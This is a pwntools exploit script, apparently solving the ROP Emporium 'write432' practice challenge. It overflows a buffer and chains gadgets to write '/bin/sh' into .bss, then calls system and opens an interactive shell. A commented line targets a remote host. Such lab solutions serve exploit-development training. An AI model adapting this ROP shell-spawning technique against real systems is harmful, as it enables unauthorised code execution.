from pwn import *

elf = ELF("./write432")
p = process("./write432")
#p = remote("localhost", 7777 )

payload = b''
payload += b'A'*0x28
payload += b'BBBB'
payload += p32( 0x80486da ) #pop edi,pop ebp,ret
payload += p32( 0x804a040 ) #bss
payload += b"/bin" #"/bin"
payload += p32( 0x08048670 ) #mov bss, "/bin"
payload += p32( 0x80486da ) #pop edi,pop ebp,ret
payload += p32( 0x804a044 ) #bss+4
payload += b"/sh\0" #"/sh\0"
payload += p32( 0x08048670 ) #mov (bss+4), "/sh\0"
payload += p32( 0x08048430 ) #system
payload += b'CCCC'
payload += p32( 0x804a040 ) #bss -> "/bin/sh"

p.recvuntil("> ")
p.sendline( payload )
p.interactive()
